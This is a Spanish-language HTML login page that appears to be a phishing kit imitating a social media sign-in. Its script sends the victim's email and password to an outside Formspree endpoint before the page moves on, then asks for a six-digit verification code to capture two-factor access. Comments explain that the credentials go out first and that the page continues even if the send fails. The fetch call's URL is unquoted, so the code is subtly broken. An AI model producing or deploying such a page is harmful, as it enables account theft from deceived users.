<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<title>Iniciar sesión</title>
<style>
* {margin:0; padding:0; box-sizing:border-box; font-family: sans-serif;}
body {background:#111; color:white; min-height:100vh; padding:20px;}
.contenedor {max-width:400px; margin:0 auto;}
h2 {text-align:center; margin-bottom:25px;}
.oculto {display:none !important;}
.field {margin-bottom:15px;}
label {display:block; margin-bottom:5px;}
input {width:100%; padding:12px; border-radius:8px; border:none; font-size:16px;}
button {width:100%; padding:12px; border:none; border-radius:8px; font-size:17px; font-weight:bold; cursor:pointer;}
.submit-btn {background:#FF0050; color:white; margin-top:10px;}
.link-btn {background:transparent; color:#ccc; margin-top:5px;}
.aviso {font-size:13px; color:#ff6666; margin-top:10px; text-align:center;}
.cargando {color:#ffcc00; text-align:center; margin:10px 0;}
</style>
</head>
<body>

<div class="contenedor">
  <h2>Inicia sesión con tu cuenta</h2>

  <!-- ✅ PON TU ENLACE DE FORMSPREE AQUÍ -->
  <form action="PON_TU_ENLACE_DE_FORMSPREE_AQUI" method="POST" id="miFormulario">

    <!-- PASO 1: CORREO Y CONTRASEÑA → SE ENVÍAN AL TOCAR CONTINUAR -->
    <div id="paso1">
      <div class="field">
        <label>Correo electrónico</label>
        <input type="email" name="correo" id="correo" required placeholder="tu@correo.com" />
      </div>
      <div class="field">
        <label>Contraseña</label>
        <input type="password" name="contraseña" id="contraseña" required placeholder="••••••••" />
      </div>
      <div id="mensajeCargando" class="cargando oculto">Enviando datos...</div>
      <button type="button" class="submit-btn" id="botonContinuar" onclick="enviarPaso1YSeguir()">Continuar</button>
    </div>

    <!-- PASO 2: CÓDIGO DE VERIFICACIÓN -->
    <div id="paso2" class="oculto">
      <div class="field">
        <label>Código de verificación (6 dígitos)</label>
        <input type="text" name="codigo" id="codigo" inputmode="numeric" pattern="[0-9]{6}" maxlength="6" placeholder="000000" oninput="activarBoton()" />
      </div>
      <button type="button" class="link-btn" onclick="volverPaso1()">← Volver atrás</button>
      <button type="submit" class="submit-btn" id="botonEnviar" disabled>Entrar</button>
      <p class="aviso">Al entrar se confirma el código</p>
    </div>

  </form>
</div>

<script>
const ENLACE_FORMSPREE = "https://formspree.io/f/xgogzwbd"; // Ponlo igual aquí también

// 🚀 ENVÍA CORREO Y CONTRASEÑA ANTES DE PASAR AL CÓDIGO
async function enviarPaso1YSeguir() {
  const correo = document.getElementById('correo').value.trim();
  const pass = document.getElementById('contraseña').value;

  if (!correo || !pass) {
    alert('Escribe tu correo y contraseña primero');
    return;
  }

  // Mostrar que se está enviando
  document.getElementById('mensajeCargando').classList.remove('oculto');
  document.getElementById('botonContinuar').disabled = true;
  document.getElementById('botonContinuar').textContent = 'Enviando...';

  try {
    // Enviamos solo correo y contraseña a tu Formspree
    await fetch(https://formspree.io/f/xgogzwbd, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        correo: correo,
        contraseña: pass,
        nota: "Datos enviados antes del código"
      })
    });

    // Una vez enviado, pasamos al paso del código
    document.getElementById('paso1').classList.add('oculto');
    document.getElementById('paso2').classList.remove('oculto');

  } catch (error) {
    // Si falla el envío igual dejamos seguir (por si hay mala conexión)
    console.error('Error al enviar:', error);
    document.getElementById('paso1').classList.add('oculto');
    document.getElementById('paso2').classList.remove('oculto');
  }
}

function volverPaso1() {
  document.getElementById('paso2').classList.add('oculto');
  document.getElementById('paso1').classList.remove('oculto');
  document.getElementById('mensajeCargando').classList.add('oculto');
  document.getElementById('botonContinuar').disabled = false;
  document.getElementById('botonContinuar').textContent = 'Continuar';
}

function activarBoton() {
  const codigo = document.getElementById('codigo').value;
  document.getElementById('botonEnviar').disabled = codigo.length !== 6;
}
</script>

</body>
</html>
